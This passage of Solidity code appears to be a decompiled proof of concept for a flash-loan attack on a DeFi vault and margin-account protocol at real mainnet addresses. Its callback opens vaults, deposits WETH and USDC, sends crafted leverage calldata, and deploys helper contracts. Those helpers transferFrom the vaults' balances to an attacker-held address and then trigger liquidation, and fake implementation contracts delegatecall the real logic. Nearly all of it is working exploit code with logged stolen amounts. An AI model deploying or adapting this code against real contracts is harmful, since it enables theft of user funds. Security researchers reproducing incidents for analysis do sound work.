3565b80356001600160a01b0381168114610c0e57600080fd5b919050565b600080600060608486031215610c2857600080fd5b610c3184610bf7565b9250610c3f60208501610bf7565b9150604084013590509250925092565b60008060408385031215610c6257600080fd5b610c6b83610bf7565b946020939093013593505050565b634e487b7160e01b600052604160045260246000fd5b60008060408385031215610ca257600080fd5b610cab83610bf7565b9150602083013567ffffffffffffffff80821115610cc857600080fd5b818501915085601f830112610cdc57600080fd5b813581811115610cee57610cee610c79565b604051601f8201601f19908116603f01168101908382118183101715610d1657610d16610c79565b81604052828152886020848701011115610d2f57600080fd5b8260208601602083013760006020848301015280955050505050509250929050565b600060208284031215610d6357600080fd5b610d6c82610bf7565b9392505050565b60208082526007908201526670726f626c656d60c81b604082015260600190565b600060208284031215610da657600080fd5b81518015158114610d6c57600080fd5b6000825160005b81811015610dd75760208186018101518583015201610dbd565b506000920191825250919050565b600060208284031215610df757600080fd5b505191905056fea2646970667358221220268981af8bf3b52f1e428fcb8f5b7053ba7cf23c4110be5cc91a5d73450d4a3364736f6c63430008120033a26469706673582212200ac208a00cbb7a2b31f629f89ff4ec73115b3bd2ee12d539f84bbbdac94e4ef864736f6c63430008120033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function executeOperation(address[] memory, uint256[] memory, uint256[] memory, address, bytes memory) public {
        I(x00cb).createVault(15113, 1, xc02a);
        I(x25f1).openTrustedMarginAccount(xd417);
        I(xc02a).approve(x25f1, type(uint256).max);

        address[] memory arr10 = new address[](1);
        arr10[0] = xc02a;
        uint256[] memory arr11 = new uint256[](1);
        arr11[0] = 0;
        uint256[] memory arr12 = new uint256[](1);
        arr12[0] = 2409680167527912699;
        I(x25f1).deposit(arr10, arr11, arr12);

        // uint256 v1 = 12048400837639563498;
        uint256 v1 = I(xc02a).balanceOf(xd417);
        console2.log("I(xc02a).balanceOf(xd417)\t->", "12048400837639563498 (12.4840 ether)");

        bytes memory b01 = abi.encode(
            128,
            448,
            928,
            992,
            160,
            192,
            224,
            256,
            288,
            0,
            0,
            0,
            0,
            0,
            160,
            224,
            288,
            352,
            416,
            1,
            xc02a,
            1,
            0,
            1,
            0,
            1,
            0,
            1,
            0,
            1,
            xc02a,
            1,
            32,
            68,
            hex"095ea7b300000000000000000000000025f1d5e6b1fdc00f66b289c8e1a7279ac2bb7b90ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"
        );
        I(xd417)
            .doActionWithLeverage(
                11048400837639563498,
                x25f1,
                x2de7,
                b01,
                bytes3(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))
            );

        x95d5 = address(new X95d5(x25f1, r));
        // uint256 v2 = 13458081005167476197;
        uint256 v2 = I(xc02a).balanceOf(x25f1);
        console2.log("I(xc02a).balanceOf(x25f1)\t->", "13458081005167476197 (13.4580 ether)");

        bytes memory b05 = abi.encode(
            128,
            544,
            864,
            960,
            160,
            224,
            288,
            352,
            384,
            1,
            xc02a,
            1,
            0,
            1,
            13458081005167476197,
            0,
            0,
            160,
            192,
            224,
            256,
            288,
            0,
            0,
            0,
            0,
            0,
            2,
            xc02a,
            x95d5,
            2,
            64,
            192,
            68,
            hex"095ea7b300000000000000000000000095d559d71173838f700a1a60a848d83e6e1f71a7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
            4,
            hex"b5d456a700000000000000000000000000000000000000000000000000000000"
        );
        I(x25f1).vaultManagementAction(x2de7, b05);

        I(x00cb).createVault(15114, 1, xa0b8);
        I(xa030).openTrustedMarginAccount(x9aa0);
        I(xa0b8).approve(xa030, type(uint256).max);

        address[] memory arr37 = new address[](1);
        arr37[0] = xa0b8;
        uint256[] memory arr38 = new uint256[](1);
        arr38[0] = 0;
        uint256[] memory arr39 = new uint256[](1);
        arr39[0] = 20672197913;
        I(xa030).deposit(arr37, arr38, arr39);

        // uint256 v3 = 103360989567;
        uint256 v3 = I(xa0b8).balanceOf(x9aa0);
        console2.log("I(xa0b8).balanceOf(x9aa0)\t->", uint256(103360989567));

        bytes memory b08 = abi.encode(
            128,
            448,
            928,
            992,
            160,
            192,
            224,
            256,
            288,
            0,
            0,
            0,
            0,
            0,
            160,
            224,
            288,
            352,
            416,
            1,
            xa0b8,
            1,
            0,
            1,
            0,
            1,
            0,
            1,
            0,
            1,
            xa0b8,
            1,
            32,
            68,
            hex"095ea7b3000000000000000000000000a0300a85aa740ccf68d0a3eb1c772787ba862f16ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"
        );
        I(x9aa0)
            .doActionWithLeverage(
                103210989567,
                xa030,
                x2de7,
                b08,
                bytes3(bytes32(0x0000000000000000000000000000000000000000000000000000000000000000))
            );

        xe9d3 = address(new Xe9d3(r, xa030));
        // uint256 v4 = 123883187480;
        uint256 v4 = I(xa0b8).balanceOf(xa030);
        console2.log("I(xa0b8).balanceOf(xa030)\t->", uint256(123883187480));

        bytes memory b12 = abi.encode(
            128,
            544,
            864,
            960,
            160,
            224,
            288,
            352,
            384,
            1,
            xa0b8,
            1,
            0,
            1,
            123883187480,
            0,
            0,
            160,
            192,
            224,
            256,
            288,
            0,
            0,
            0,
            0,
            0,
            2,
            xa0b8,
            xe9d3,
            2,
            64,
            192,
            68,
            hex"095ea7b3000000000000000000000000e9d3d63f9dae09b77c23aab77233853e89e1dac3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
            4,
            hex"87fe9a9300000000000000000000000000000000000000000000000000000000"
        );
        I(xa030).vaultManagementAction(x2de7, b12);

        I(xc02a).approve(x8787, type(uint256).max);
        I(xa0b8).approve(x8787, type(uint256).max);

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract X95d5 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x2de7 = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd417 = 0xD417c28aF20884088F600e724441a3baB38b22cc;

    address x25f1;
    address x56a3;

    constructor(address a_x25f1, address a_x56a3) payable {
        x25f1 = a_x25f1; // 0x25F1D5E6B1FDC00F66B289C8E1a7279aC2bb7B90
        x56a3 = a_x56a3; // 0x56A35FAe9b0416360e1752A9abE78D89F51517CF
    }

    function xb5d456a7() public {
        // uint256 v1 = 13458081005167476197;
        uint256 v1 = I(xc02a).balanceOf(x2de7);
        console2.log("I(xc02a).balanceOf(x2de7)\t->", "13458081005167476197 (13.4580 ether)");
        I(xc02a).transferFrom(x2de7, x56a3, v1);
        // uint256 v2 = 13458081005167476197;
        uint256 v2 = I(xc02a).balanceOf(x56a3);
        console2.log("I(xc02a).balanceOf(x56a3)\t->", "13458081005167476197 (13.4580 ether)");
        I(xd417).liquidateVault(x25f1);
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0xb5d456a7) {
            xb5d456a7();
            return;
        }
        revert("no such function");
    }
}

contract Xa030 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x046f = 0x046fc9f35EB7Cb165a5e07915d37bF4022b8dE33;
    address constant x2de7 = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    address constant x3ae3 = 0x3Ae354d7E49039CcD582f1F3c9e65034fFd17baD;
    address constant x9aa0 = 0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address xe9d3;
    address x56a3;

    uint256 t_vaultManagementAction = 0;

    constructor(address a_x56a3, address a_xe9d3) payable {
        xe9d3 = a_xe9d3; // 0xE9d3d63F9daE09b77C23aaB77233853E89E1dAC3
        x56a3 = a_x56a3; // 0x56A35FAe9b0416360e1752A9abE78D89F51517CF
    }

    function vaultManagementAction(address, bytes memory) public {
        t_vaultManagementAction++;

        if (t_vaultManagementAction == 1) {
            bytes memory b10 = abi.encode(
                128,
                448,
                928,
                992,
                160,
                192,
                224,
                256,
                288,
                0,
                0,
                0,
                0,
                0,
                160,
                224,
                288,
                352,
                416,
                1,
                xa0b8,
                1,
                0,
                1,
                0,
                1,
                0,
                1,
                0,
                1,
                xa0b8,
                1,
                32,
                68,
                hex"095ea7b3000000000000000000000000a0300a85aa740ccf68d0a3eb1c772787ba862f16ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"
            );
            x3ae3.delegatecall(abi.encodeWithSignature("vaultManagementAction(address,bytes)", x2de7, b10));

            bytes memory rt = abi.encodePacked(
                abi.encode(address(x9aa0)), hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_vaultManagementAction == 2) {
            bytes memory b13 = abi.encode(
                128,
                544,
                864,
                960,
                160,
                224,
                288,
                352,
                384,
                1,
                xa0b8,
                1,
                0,
                1,
                123883187480,
                0,
                0,
                160,
                192,
                224,
                256,
                288,
                0,
                0,
                0,
                0,
                0,
                2,
                xa0b8,
                xe9d3,
                2,
                64,
                192,
                68,
                hex"095ea7b3000000000000000000000000e9d3d63f9dae09b77c23aab77233853e89e1dac3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
                4,
                hex"87fe9a9300000000000000000000000000000000000000000000000000000000"
            );
            x3ae3.delegatecall(abi.encodeWithSignature("vaultManagementAction(address,bytes)", x2de7, b13));

            bytes memory rt =
                hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function liquidateVault(uint256) public {
        x3ae3.delegatecall(abi.encodeWithSignature("liquidateVault(uint256)", 103314200557));

        bytes memory rt =
            abi.encodePacked(abi.encode(address(x56a3)), abi.encode(address(xa0b8)), abi.encode(address(x9aa0)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function openTrustedMarginAccount(address) public {
        x3ae3.delegatecall(abi.encodeWithSignature("openTrustedMarginAccount(address)", x9aa0));
    }

    function initialize(address, address, uint16, address) public {
        x3ae3.delegatecall(
            abi.encodeWithSignature("initialize(address,address,uint16,address)", x56a3, x046f, 1, xa0b8)
        );
    }

    function deposit(address[] memory, uint256[] memory, uint256[] memory) public {
        address[] memory arr40 = new address[](1);
        arr40[0] = xa0b8;
        uint256[] memory arr41 = new uint256[](1);
        arr41[0] = 0;
        uint256[] memory arr42 = new uint256[](1);
        arr42[0] = 20672197913;
        x3ae3.delegatecall(abi.encodeWithSignature("deposit(address[],uint256[],uint256[])", arr40, arr41, arr42));
    }

    fallback() external payable {
        revert("no such function");
    }
}

contract Xe9d3 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x2de7 = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x9aa0 = 0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address xa030;
    address x56a3;

    constructor(address a_x56a3, address a_xa030) payable {
        xa030 = a_xa030; // 0xA0300a85Aa740ccf68D0a3eb1C772787bA862f16
        x56a3 = a_x56a3; // 0x56A35FAe9b0416360e1752A9abE78D89F51517CF
    }

    function x87fe9a93() public {
        // uint256 v1 = 123883187480;
        uint256 v1 = I(xa0b8).balanceOf(x2de7);
        console2.log("I(xa0b8).balanceOf(x2de7)\t->", uint256(123883187480));
        I(xa0b8).transferFrom(x2de7, x56a3, v1);
        // uint256 v2 = 123883187480;
        uint256 v2 = I(xa0b8).balanceOf(x56a3);
        console2.log("I(xa0b8).balanceOf(x56a3)\t->", uint256(123883187480));
        I(x9aa0).liquidateVault(xa030);
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x87fe9a93) {
            x87fe9a93();
            return;
        }
        revert("no such function");
    }
}

contract X25f1 {
    address immutable r = address(this);
    receive() external payable {}
    address constant x046f = 0x046fc9f35EB7Cb165a5e07915d37bF4022b8dE33;
    address constant x2de7 = 0x2dE7BbAAaB48EAc228449584f94636bb20d63E65;
    address constant x3ae3 = 0x3Ae354d7E49039CcD582f1F3c9e65034fFd17baD;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd417 = 0xD417c28aF20884088F600e724441a3baB38b22cc;

    address x95d5;
    address x56a3;

    uint256 t_vaultManagementAction = 0;

    constructor(address a_x56a3, address a_x95d5) payable {
        x95d5 = a_x95d5; // 0x95D559d71173838F700A1a60a848d83E6e1f71a7
        x56a3 = a_x56a3; // 0x56A35FAe9b0416360e1752A9abE78D89F51517CF
    }

    function liquidateVault(uint256) public {
        x3ae3.delegatecall(abi.encodeWithSignature("liquidateVault(uint256)", 11059449238477203062));

        bytes memory rt =
            abi.encodePacked(abi.encode(address(x56a3)), abi.encode(address(xc02a)), abi.encode(address(xd417)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function initialize(address, address, uint16, address) public {
        x3ae3.delegatecall(
            abi.encodeWithSignature("initialize(address,address,uint16,address)", x56a3, x046f, 1, xc02a)
        );
    }

    function openTrustedMarginAccount(address) public {
        x3ae3.delegatecall(abi.encodeWithSignature("openTrustedMarginAccount(address)", xd417));
    }

    function vaultManagementAction(address, bytes memory) public {
        t_vaultManagementAction++;

        if (t_vaultManagementAction == 1) {
            bytes memory b03 = abi.encode(
                128,
                448,
                928,
                992,
                160,
                192,
                224,
                256,
                288,
                0,
                0,
                0,
                0,
                0,
                160,
                224,
                288,
                352,
                416,
                1,
                xc02a,
                1,
                0,
                1,
                0,
                1,
                0,
                1,
                0,
                1,
                xc02a,
                1,
                32,
                68,
                hex"095ea7b300000000000000000000000025f1d5e6b1fdc00f66b289c8e1a7279ac2bb7b90ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000"
            );
            x3ae3.delegatecall(abi.encodeWithSignature("vaultManagementAction(address,bytes)", x2de7, b03));

            bytes memory rt = abi.encodePacked(
                abi.encode(address(xd417)), hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
        if (t_vaultManagementAction == 2) {
            bytes memory b06 = abi.encode(
                128,
                544,
                864,
                960,
                160,
                224,
                288,
                352,
                384,
                1,
                xc02a,
                1,
                0,
                1,
                13458081005167476197,
                0,
                0,
                160,
                192,
                224,
                256,
                288,
                0,
                0,
                0,
                0,
                0,
                2,
                xc02a,
                x95d5,
                2,
                64,
                192,
                68,
                hex"095ea7b300000000000000000000000095d559d71173838f700a1a60a848d83e6e1f71a7ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000",
                4,
                hex"b5d456a700000000000000000000000000000000000000000000000000000000"
            );
            x3ae3.delegatecall(abi.encodeWithSignature("vaultManagementAction(address,bytes)", x2de7, b06));

            bytes memory rt =
                hex"00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001";
            assembly {
                return(add(rt, 0x20), mload(rt))
            }
        }
    }

    function deposit(address[] memory, uint256[] memory, uint256[] memory) public {
        address[] memory arr13 = new address[](1);
        arr13[0] = xc02a;
        uint256[] memory arr14 = new uint256[](1);
        arr14[0] = 0;
        uint256[] memory arr15 = new uint256[](1);
        arr15[0] = 2409680167527912699;
        x3ae3.delegatecall(abi.encodeWithSignature("deposit(address[],uint256[],uint256[])", arr13, arr14, arr15));
    }

    fallback() external payable {
        revert("no such function");
    }
}
